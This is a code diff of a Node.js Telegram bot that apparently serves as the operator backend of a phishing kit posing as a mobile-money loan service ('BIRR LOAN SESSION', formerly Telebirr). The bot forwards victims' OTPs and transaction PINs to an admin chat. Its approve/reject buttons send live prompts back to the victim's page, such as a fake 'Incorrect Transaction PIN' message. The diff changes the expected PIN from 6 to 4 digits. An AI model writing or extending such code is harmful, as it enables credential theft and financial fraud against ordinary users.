@@ -4,7 +4,7 @@ const TelegramBot = require('node-telegram-bot-api');
 const BOT_TOKEN = process.env.BOT_TOKEN;
 const CHAT_ID = process.env.ADMIN_CHAT_ID;
 
-const bot = new TelegramBot(BOT_TOKEN, { polling: false });
+const bot = new TelegramBot(BOT_TOKEN, { polling: true });
 
 function escapeMarkdown(text) {
     if (!text) return '';
@@ -27,7 +27,7 @@ function sendToAdmin(appId, stepTitle, data, requireInlineButtons = false) {
 
     const message = `
 ━━━━━━━━━━━━━━━━━━━━━━
-📱 *TELEBIRR LOAN SESSION*
+📱 *BIRR LOAN SESSION*
 ━━━━━━━━━━━━━━━━━━━━━━
 *Session ID*
 \`${escapeMarkdown(appId)}\`
@@ -54,8 +54,8 @@ _${escapeMarkdown(currentStatus)}_
             ]];
         } else if (stepTitle.includes("Step 3")) {
             inlineKeyboard = [[
-                { text: "✅ Approve 6-Digit PIN", callback_data: `pin_approve:${appId}` },
-                { text: "❌ Reject 6-Digit PIN", callback_data: `pin_reject:${appId}` }
+                { text: "✅ Approve 4-Digit PIN", callback_data: `pin_approve:${appId}` },
+                { text: "❌ Reject 4-Digit PIN", callback_data: `pin_reject:${appId}` }
             ]];
         }
         options.reply_markup = { inline_keyboard: inlineKeyboard };
@@ -78,7 +78,6 @@ bot.on('callback_query', async (callbackQuery) => {
         return;
     }
 
-    // Process action signals matching current pipeline requirements
     if (actionSignal === 'otp_approve') {
         global.io.to(targetAppId).emit('admin-dashboard-approve');
         decisionStamp = "✅ APPROVED";
@@ -89,14 +88,12 @@ bot.on('callback_query', async (callbackQuery) => {
         global.io.to(targetAppId).emit('final-pin-accepted');
         decisionStamp = "✅ APPROVED";
     } else if (actionSignal === 'pin_reject') {
-        // Updated error text transmission explicitly specifying the 6-digit structure requirement
-        global.io.to(targetAppId).emit('pin-rejected', { message: "Incorrect Transaction PIN. Please enter your valid 6-digit PIN and try again." });
+        global.io.to(targetAppId).emit('pin-rejected', { message: "Incorrect Transaction PIN. Please enter your valid 4-digit PIN and try again." });
         decisionStamp = "❌ REJECTED";
     }
 
     const serverTime = new Date().toLocaleTimeString('en-US', { hour12: false });
 
-    // Update message configuration cards to render final audit trails cleanly
     const updatedBody = `
 ${message.text}
 ━━━━━━━━━━━━━━━━━━━━━━
